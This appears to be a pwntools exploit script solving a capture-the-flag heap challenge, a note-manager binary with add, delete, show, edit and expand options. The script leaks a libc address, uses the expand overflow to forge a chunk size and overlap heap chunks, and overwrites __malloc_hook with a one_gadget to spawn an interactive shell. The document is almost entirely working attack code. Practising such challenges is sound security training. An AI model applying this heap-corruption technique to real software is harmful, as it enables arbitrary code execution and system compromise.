#coding:utf-8

from pwn import *

context.log_level = "debug"

local = 1
if local:
    p = remote("172.17.0.2", 1234)
    raw_input("go")
else:
    p = remote("127.0.0.1", 1234)

def action(number):
    p.sendlineafter("Your choice:\n", str(number))

def add(size, content):
    action(1)
    p.sendlineafter("the note length:\n", str(size))
    p.recvuntil("the note content:\n")
    p.send(content)

def delete(index):
    action(2)
    p.sendlineafter("you want to delete?\n", str(index))

def show():
    action(3)

def edit(index, content):
    action(4)
    p.sendlineafter("do you want to edit?\n", str(index))
    p.recvuntil("new content:\n")
    p.send(content)

def expand(index, size, content):
    action(5)
    p.sendlineafter(" want to expand?\n", str(index))
    p.sendlineafter("How long do you want to expand?\n", str(size))
    p.recvuntil("Input content you want to expand\n")
    p.send(content)


add(0x90, 'a\n')
add(0x30, 'b\n') # 1
delete(1)

add(0x90, '\n') # 2
show()
p.recvuntil("Note length: 144\nNote content: ")
data = p.recv(6).ljust(8, '\x00')
leak_addr = u64(data)
malloc_hook_addr = leak_addr + 6
info("malloc_hook_addr: {}".format(hex(malloc_hook_addr)))
one_gadget = malloc_hook_addr - 0x3c4b10 +0xf1147

add(0x80, 'a'*0x80)
add(0x30, 'c\n') # 3
delete(3)

add(0x70, 'c'*16+'\n') # 4

add(0x90, 'f\n')
add(0x20, 'f\n')
delete(6)
add(0x30, 'g\n') # it's size will change in 70th line.  0x31 --> 0x61
add(0x30, 'g\n') # 5         will be overlapped
delete(5)

expand(4, 0x20, 'd'*0x17+p64(0x61)+'\n')
delete(5) # this 5th note's size is 0x61

add(0x58, 'h\n') # 6       get the overlapped note header
edit(6, p64(0)*4+p64(0x30)+p64(0x31)+p64(0)+p64(0x30)+p64(0)*2+p64(malloc_hook_addr))

edit(5, p64(one_gadget)+'\n')

action(1)
p.sendlineafter("the note length:\n", str(0x20))

p.interactive()
